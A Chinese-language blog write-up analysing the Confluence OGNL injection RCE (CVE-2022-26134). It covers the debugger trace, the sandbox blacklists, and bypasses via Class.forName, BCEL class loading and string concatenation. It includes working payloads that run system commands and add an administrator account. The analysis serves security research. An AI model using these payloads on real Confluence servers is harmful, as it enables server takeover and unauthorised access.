<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>CVE-2022-26134 Confluence Ognl Rce 利用总结 - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="CVE-2022-26134 Confluence Ognl Rce 利用总结 - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/07/15/CVE-2022-26134%20Confluence%20OGNL%20RCE%20%E6%B5%85%E6%9E%90%20-%20%E5%89%AF%E6%9C%AC/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-07-15T14:46:18.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/At-Dawn/">At Dawn</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>July</span>
            <span>15,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">CVE-2022-26134 Confluence Ognl Rce 利用总结</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="🤨环境搭建"><a href="#🤨环境搭建" class="headerlink" title="🤨环境搭建"></a>🤨环境搭建</h1><p>很痛苦，环境搭建，屁事情贼多。</p>
<blockquote>
<p>漏洞影响范围<br>Confluence Server and Data Center &gt;&#x3D; 1.3.0<br>Confluence Server and Data Center &lt; 7.4.17<br>Confluence Server and Data Center &lt; 7.13.7<br>Confluence Server and Data Center &lt; 7.14.3<br>Confluence Server and Data Center &lt; 7.15.2<br>Confluence Server and Data Center &lt; 7.16.4<br>Confluence Server and Data Center &lt; 7.17.4<br>Confluence Server and Data Center &lt; 7.18.1</p>
</blockquote>
<p>我选的版本是7.15.1，下载地址在：<br><a target="_blank" rel="noopener" href="https://www.atlassian.com/zh/software/confluence/download-archives">Confluence Server 下载存档 | Atlassian</a><br>选择windows版本的exe，然后选择安装路径，安装完后是这样子的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428379775-bad38c5e-ffec-493e-af04-a1a95127185c.png#averageHue=%23eeeceb&clientId=u822f3dcb-6fe3-4&from=paste&height=390&id=u078d6042&originHeight=488&originWidth=876&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59751&status=done&style=none&taskId=u4f7826d9-125b-4887-bed7-fcff312b137&title=&width=700.8" alt="image.png"><br>进入Confluence文件夹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428388466-4a67e2ac-07e7-48db-ac2a-6d2806563172.png#averageHue=%23f9f8f7&clientId=u822f3dcb-6fe3-4&from=paste&height=396&id=uaab4bec3&originHeight=495&originWidth=918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=69504&status=done&style=none&taskId=uade8fc3b-b50c-4edd-bb8e-f91634122c6&title=&width=734.4" alt="image.png"><br><code>startup_bundled_jre.bat</code>就可以启动服务了。启动后会要求我们配置postgresql，这里自行去安装个postgresql就好了。然后创建个数据库，跟着向导一步步点yes就可以。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428430318-cd2ae530-6bfc-414b-a9ce-205f76d045d6.png#averageHue=%23d8e1ee&clientId=u822f3dcb-6fe3-4&from=paste&height=535&id=uad906e54&originHeight=669&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83776&status=done&style=none&taskId=u150b9894-2507-441c-9ff0-0ab938b28e6&title=&width=1530.4" alt="image.png"><br>然后样子就是这样子，至此还剩下Debug，因为本质就是个tomcat服务。我们直接在catalina.bat行首加上<br><code>SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005</code><br>之后启动服务即可。<br>记得把文件夹所有jar包放进依赖里。</p>
<h1 id="🤫漏洞复现"><a href="#🤫漏洞复现" class="headerlink" title="🤫漏洞复现"></a>🤫漏洞复现</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428529973-09c548ad-3e86-44f7-b594-b1ad7eab8c8b.png#averageHue=%238d834d&clientId=u822f3dcb-6fe3-4&from=paste&height=594&id=u7c5b542a&originHeight=743&originWidth=1472&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=203976&status=done&style=none&taskId=u14da21c8-99c3-4c18-bb9e-c9180739f80&title=&width=1177.6" alt="image.png"><br>直接前台就可以rce了，本质上是ognl注入，和struct2一样的。其中payload是<br><code>$&#123;Class.forName(&quot;com.opensymphony.webwork.ServletActionContext&quot;).getMethod(&quot;getResponse&quot;,null).invoke(null,null).setHeader(&quot;X-CMD&quot;,Class.forName(&quot;javax.script.ScriptEngineManager&quot;).newInstance().getEngineByName(&quot;nashorn&quot;).eval(&quot;eval(String.fromCharCode(118,97,114,32,115,61,39,39,59,118,97,114,32,112,112,32,61,32,106,97,118,97,46,108,97,110,103,46,82,117,110,116,105,109,101,46,103,101,116,82,117,110,116,105,109,101,40,41,46,101,120,101,99,40,39,105,100,39,41,46,103,101,116,73,110,112,117,116,83,116,114,101,97,109,40,41,59,119,104,105,108,101,32,40,49,41,32,123,118,97,114,32,98,32,61,32,112,112,46,114,101,97,100,40,41,59,105,102,32,40,98,32,61,61,32,45,49,41,32,123,98,114,101,97,107,59,125,115,61,115,43,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,98,41,125,59,115))&quot;))&#125;</code><br>这里涉及到很多细节，接下来会讲解。</p>
<h1 id="😋漏洞原理分析"><a href="#😋漏洞原理分析" class="headerlink" title="😋漏洞原理分析"></a>😋漏洞原理分析</h1><p><code>TextParseUtil#translateVariables</code>给上断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428615627-c94854c9-0fd8-4b7d-9a45-dd8592d5dcb8.png#averageHue=%232b2c28&clientId=u822f3dcb-6fe3-4&from=paste&height=576&id=uf777d566&originHeight=720&originWidth=1782&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1801646&status=done&style=none&taskId=u730b0792-e94c-4115-8e5e-67bcbccf362&title=&width=1425.6" alt="image.png"><br>然后发送我们的payload<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428672148-644ebe68-d2c0-41e7-9a29-c54035af727d.png#averageHue=%232b2d2a&clientId=u822f3dcb-6fe3-4&from=paste&height=748&id=u548f7f64&originHeight=935&originWidth=1833&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2389095&status=done&style=none&taskId=u2fc4a3df-bec3-484d-bba1-80b1d551ac4&title=&width=1466.4" alt="image.png"><br>然后调用栈如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428927586-1eb0d503-b04f-463e-b241-53e70fbc6dcf.png#averageHue=%23313330&clientId=u822f3dcb-6fe3-4&from=paste&height=231&id=ue532ba65&originHeight=289&originWidth=891&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=394631&status=done&style=none&taskId=u276e9d56-d64d-435d-898e-7e95c2f207e&title=&width=712.8" alt="image.png"><br>在filter结束后就分发dispatch了，然后会获取namespace也就是路由<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428952845-cc7fd9f8-0159-41c4-8f89-0a2ab8d98aaa.png#averageHue=%232b2d2a&clientId=u822f3dcb-6fe3-4&from=paste&height=732&id=u3cf6c807&originHeight=915&originWidth=1838&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2368016&status=done&style=none&taskId=u0e935517-c2b0-4a15-8c2e-58f6e61c4e1&title=&width=1470.4" alt="image.png"><br>随之进入<code>serviceAction</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689428974510-5b00582c-42fb-495a-b844-5e3c0f97f3b7.png#averageHue=%232e312e&clientId=u822f3dcb-6fe3-4&from=paste&height=781&id=u3cb47947&originHeight=976&originWidth=1450&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2014686&status=done&style=none&taskId=u7b276aa4-e638-4fb2-9856-ff951ab3f2d&title=&width=1160" alt="image.png"><br>excute方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429005861-841b4530-cfed-4600-afb6-c0bc884caf19.png#averageHue=%232a2c2a&clientId=u822f3dcb-6fe3-4&from=paste&height=699&id=u0f3338e0&originHeight=874&originWidth=1399&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1674145&status=done&style=none&taskId=u108e954e-af0a-4145-b533-ffe298fe911&title=&width=1119.2" alt="image.png"><br>invoke触发代理<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429027346-f12fd853-6c7d-48e1-aa00-e463c2acc95f.png#averageHue=%232b2c29&clientId=u822f3dcb-6fe3-4&from=paste&height=545&id=u9ae84984&originHeight=681&originWidth=1435&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1345962&status=done&style=none&taskId=u200762e6-a51c-4d64-8369-e1c95f22451&title=&width=1148" alt="image.png"><br>传入interceptor里面。然后一顿代理触发<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429060379-7cde6eb3-fa33-4db1-8948-3f53209d811c.png#averageHue=%232a2c29&clientId=u822f3dcb-6fe3-4&from=paste&height=720&id=u09841ef1&originHeight=900&originWidth=1481&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1826251&status=done&style=none&taskId=ue3067b50-3782-4836-8850-39cb610fd55&title=&width=1184.8" alt="image.png"><br>到了<code>executeResult</code>处理结果的地方<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429075329-447e60cd-0c2d-4769-a0f8-d937577e2cb3.png#averageHue=%232d302c&clientId=u822f3dcb-6fe3-4&from=paste&height=639&id=u65356671&originHeight=799&originWidth=1393&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1572368&status=done&style=none&taskId=u87cc4b47-c16f-4db9-a212-fa9871c5086&title=&width=1114.4" alt="image.png"><br>漏洞点就是<code>translateVariables</code>方法，namespace被传进去了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429094873-26fe7528-63da-4eb5-a85f-4a00c7ee3f0b.png#averageHue=%232b2d2b&clientId=u822f3dcb-6fe3-4&from=paste&height=594&id=u3b33c8f0&originHeight=742&originWidth=1403&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1375963&status=done&style=none&taskId=u7c056425-e6ff-4b77-9c06-7763c5e9570&title=&width=1122.4" alt="image.png"><br>最后进入findvalue方法，开始最重要的环节。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429217220-e83d0e16-2357-4c99-b8a7-34931e94aef0.png#averageHue=%232b2d2a&clientId=u822f3dcb-6fe3-4&from=paste&height=610&id=uc581d0d9&originHeight=763&originWidth=1450&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1505699&status=done&style=none&taskId=u27330c5c-6b2d-409e-8c56-f58f6d05f17&title=&width=1160" alt="image.png"><br>其实现在已经看到了RCE的执行点getValue了，而且它的OGNL是低版本的，没任何过滤，所以不需要考虑OGNL自身的黑名单，我们需要注意上面有一个if，<code>safeExpressionUtil.isSafeExpression(expr)</code>这里是一个沙箱检测。<br>在confluence7.15过后加入了这个沙箱作为检测，目前网上公开的poc好像都不是绕过这个沙箱的。上面给出了payload，我们先跟进去看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429381263-2c7ee801-3eb6-4ad5-a2b3-547abe15117c.png#averageHue=%232a2d2b&clientId=u822f3dcb-6fe3-4&from=paste&height=299&id=u611dbd90&originHeight=374&originWidth=1382&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=761124&status=done&style=none&taskId=uaf6ee9cd-0919-4377-a755-12798a19656&title=&width=1105.6" alt="image.png"><br>在这里有一系列的黑名单。内容如下<br>unsafepackage</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[java.rmi, sun.management, org.apache.catalina.session, java.jms, com.atlassian.confluence.util.io, com.google.common.reflect, javax.sql, java.nio, com.atlassian.sal.api.net, sun.invoke, java.util.zip, liquibase, com.hazelcast, org.apache.commons.httpclient, com.atlassian.util.concurrent, java.net, freemarker.ext.jsp, com.sun.jna, net.java.ao, javax, sun.corba, org.springframework.util.concurrent, com.sun.jmx, sun.misc, javassist, ognl, org.apache.commons.exec, com.atlassian.cache, org.wildfly.extension.undertow.deployment                 java.lang.reflect, io.atlassian.util.concurrent, java.util.concurrent, com.atlassian.confluence.util.http, sun.tracing, org.objectweb.asm, freemarker.template, net.sf.hibernate, freemarker.core, net.bytebuddy, org.apache.tomcat, freemarker.ext.rhino, com.atlassian.media, org.springframework.context, org.apache.velocity, javax.xml, java.sql, sun.reflect, sun.net, javax.persistence, org.javassist, javax.naming, org.apache.httpcomponents.httpclient, com.atlassian.hibernate, sun.nio, com.atlassian.confluence.impl.util.sandbox, com.google.common.net, com.atlassian.filestore, org.apache.commons.io, com.atlassian.vcache, jdk.nashorn, sun.launcher, oshi, org.apache.bcel, sun.rmi, sun.tools.jar, org.springframework.expression.spel, com.opensymphony.xwork.util, org.ow2.asm, com.atlassian.confluence.setup.bandana, org.quartz, net.sf.cglib, com.atlassian.activeobjects, com.atlassian.utils.process, sun.security, com.atlassian.quartz, javax.management, sun.awt.shell, com.google.common.cache, org.apache.http.client, java.io, com.atlassian.confluence.util.sandbox, java.util.jar, com.atlassian.scheduler, sun.print, com.atlassian.failurecache, com.google.common.io, org.apache.catalina.core, org.ehcache]</span><br></pre></td></tr></table></figure>
<p>unsafemethod<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429502839-7ae2d7b4-96cb-4409-8576-0db534ff4466.png#averageHue=%23282a29&clientId=u822f3dcb-6fe3-4&from=paste&height=98&id=u74756a3d&originHeight=123&originWidth=587&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=106180&status=done&style=none&taskId=ud91819d3-7b6f-4a87-b15a-db07861c33c&title=&width=469.6" alt="image.png"><br>allowedclass</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[net.sf.hibernate.proxy.HibernateProxy, java.lang.reflect.Proxy, net.java.ao.EntityProxyAccessor, net.java.ao.RawEntity, net.sf.cglib.proxy.Factory, java.io.ObjectInputValidation, net.java.ao.Entity, com.atlassian.confluence.util.GeneralUtil, java.io.Serializable]</span><br></pre></td></tr></table></figure>
<p>网上好多poc其实都是直接调用什么new javax什么的，这在黑名单里面的，只针对低版本没沙箱，然后进入一段try catch<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429660891-9b0d6eb6-be0a-4d08-a385-7e251fb37dc6.png#averageHue=%232b2d2b&clientId=u822f3dcb-6fe3-4&from=paste&height=653&id=ub3dca8b0&originHeight=816&originWidth=1373&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1576533&status=done&style=none&taskId=uecb5b61d-34da-45b2-91fb-1431cab1ead&title=&width=1098.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689429696820-6af45444-0f0f-405a-b98d-a1df9357db45.png#averageHue=%23292a27&clientId=u822f3dcb-6fe3-4&from=paste&height=330&id=u301d641c&originHeight=413&originWidth=1282&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=725370&status=done&style=none&taskId=u799b66fc-9fbf-460e-a8db-829fc96e1ad&title=&width=1025.6" alt="image.png"><br>很妙的地方来了。在containsUnsafeExpression里面有一个判断<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430000785-16551f87-8ce7-49d0-a301-44bb78055a01.png#averageHue=%232a2c2a&clientId=u69d6e554-cd1b-4&from=paste&height=535&id=u590bf247&originHeight=669&originWidth=1400&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1271598&status=done&style=none&taskId=u51591a9c-12a5-406a-bfa4-1a02bc3ffc0&title=&width=1120" alt="image.png"><br>进入isSafeConstantExpressionNode<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430200945-432503c4-27f3-4f43-ba7e-7c347207ffbe.png#averageHue=%232b2d2a&clientId=u69d6e554-cd1b-4&from=paste&height=677&id=u62ac6fd5&originHeight=846&originWidth=1357&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1529252&status=done&style=none&taskId=ue39dc602-3ecf-40cd-882d-b6721d91333&title=&width=1085.6" alt="image.png"><br>由于ServletActionContext触发了null。触发了runtime异常，进入catch，将我们的语句添加到了SAFE缓存里，所以计入了OGNL.getValue里面。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430227380-cb0a4523-1381-4ff2-bc31-0fe91643f764.png#averageHue=%232a2c2a&clientId=u69d6e554-cd1b-4&from=paste&height=567&id=u22217c9c&originHeight=709&originWidth=1452&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1418653&status=done&style=none&taskId=u395c780c-3e43-4e9b-a5f1-ad947a597f1&title=&width=1161.6" alt="image.png"><br>所以得以RCE。这是个很妙的思路。。。。这个方法可以通杀。还有一个妙点就是，绕过黑名单，我们用的是Class.forName直接绕过，因为不会被识别<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430389867-776f575c-abec-4927-a51c-577725c0c82a.png#averageHue=%232c2f2c&clientId=u69d6e554-cd1b-4&from=paste&height=615&id=u85802b81&originHeight=769&originWidth=1323&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1430808&status=done&style=none&taskId=ub95f4b32-d063-4aec-9e0a-67a8299755f&title=&width=1058.4" alt="image.png"><br>然后假如我用网上的poc的话。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430543008-e6cbf357-8da5-4343-9d98-4a0f89f2d428.png#averageHue=%232c2e2b&clientId=u69d6e554-cd1b-4&from=paste&height=682&id=ueee9c149&originHeight=853&originWidth=1389&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1680286&status=done&style=none&taskId=u22cc8a6a-d2f6-4364-8f33-0ec232bd996&title=&width=1111.2" alt="image.png"><br>在这一步就就正中靶向给识别了。所以就寄了。</p>
<h1 id="🤭沙箱绕过"><a href="#🤭沙箱绕过" class="headerlink" title="🤭沙箱绕过"></a>🤭沙箱绕过</h1><p>检查分为3个部分。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430654272-20956a2f-6e9e-4f10-baa4-2cc8e0d7cec0.png#averageHue=%232a2c28&clientId=u69d6e554-cd1b-4&from=paste&height=478&id=u7ac18421&originHeight=598&originWidth=1334&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1134922&status=done&style=none&taskId=ufd4d9d70-c796-4bbe-93dd-1b74b901db8&title=&width=1067.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430667244-f7aa2b18-4de9-43b5-a3aa-240dff8381ea.png#averageHue=%232b2c29&clientId=u69d6e554-cd1b-4&from=paste&height=450&id=uc2330161&originHeight=562&originWidth=1316&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1036598&status=done&style=none&taskId=u5fd970c7-bf68-4413-8a2b-01ce7193f2c&title=&width=1052.8" alt="image.png"></p>
<h2 id="1、使用正常功能类"><a href="#1、使用正常功能类" class="headerlink" title="1、使用正常功能类"></a>1、使用正常功能类</h2><p><code>com.atlassian.confluence.util.GeneralUtil</code>不在黑名单，自然可以，可以用它加Cookie（下面用网图）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1689430792238-7a2bf632-7811-471e-887d-8c37fa5d4702.png#averageHue=%23252425&clientId=u69d6e554-cd1b-4&from=paste&id=u00db7247&originHeight=339&originWidth=1080&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=128534&status=done&style=none&taskId=uea9201df-f3ea-4b16-a927-9d2cb8b99a2&title=" alt="image.png"><br><code>$&#123;@com.atlassian.confluence.util.GeneralUtil@setCookie(&quot;key&quot;,&quot;value&quot;)&#125;</code></p>
<h2 id="2、字符串拼贴"><a href="#2、字符串拼贴" class="headerlink" title="2、字符串拼贴"></a>2、字符串拼贴</h2><p>Class.forName里面肯定可以字符串拼贴，来绕过一些node的检测。</p>
<h2 id="3、ClassLoader"><a href="#3、ClassLoader" class="headerlink" title="3、ClassLoader"></a>3、ClassLoader</h2><p><code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>不在黑名单里，可以加载BCEL字节码RCE和内存马~这个之后想研究一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;Class.forName(&quot;org.ap&quot;+&quot;ache.bcel.util.ClassLoader&quot;).newInstance().loadClass(&quot;$$BCEL$$&quot;+code).newInstance()&#125;</span><br></pre></td></tr></table></figure>




<h2 id="4、this"><a href="#4、this" class="headerlink" title="4、this"></a>4、this</h2><p>没有ban this关键字就可以引用了，这里的this是一个URL的Action对象，可以添加管理员</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;#this.getUserAccessor().addUser(&#x27;test&#x27;,&#x27;test@1234&#x27;,&#x27;test@gmail.com&#x27;,&#x27;Test&#x27;,@com.atlassian.confluence.util.GeneralUtil@splitCommaDelimitedString(&quot;confluence-administrators,confluence-users&quot;))&#125;</span><br></pre></td></tr></table></figure>


<h1 id="🤨内存马问题"><a href="#🤨内存马问题" class="headerlink" title="🤨内存马问题"></a>🤨内存马问题</h1><p>其实根据上面的内容，我大概有2种思路</p>
<h2 id="BCEL字节码打内存马"><a href="#BCEL字节码打内存马" class="headerlink" title="BCEL字节码打内存马"></a>BCEL字节码打内存马</h2><p>我们可以反射调用BCEL来加载内存马</p>
<h2 id="ScriptEngine"><a href="#ScriptEngine" class="headerlink" title="ScriptEngine"></a>ScriptEngine</h2><p>思路是一样的，反射调用eval执行嘛。这样也可以打入内存马，但是我都没实现过。懒啦，下周试试看。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/Java/" class="tag">#Java</a><a href="/tags/CVE/" class="tag">#CVE</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/07/16/CodeQL%E5%AD%A6%E4%B9%A0/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">使用CodeQL进行利用链挖掘</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/07/15/%E9%92%88%E5%AF%B9%E4%BA%8EPbootCMS%E6%9C%80%E6%96%B0%E7%89%88%E5%89%8D%E5%8F%B0RCE%E7%9A%84%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">PbootCMS 3.2.0 以下前台RCE捡漏</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>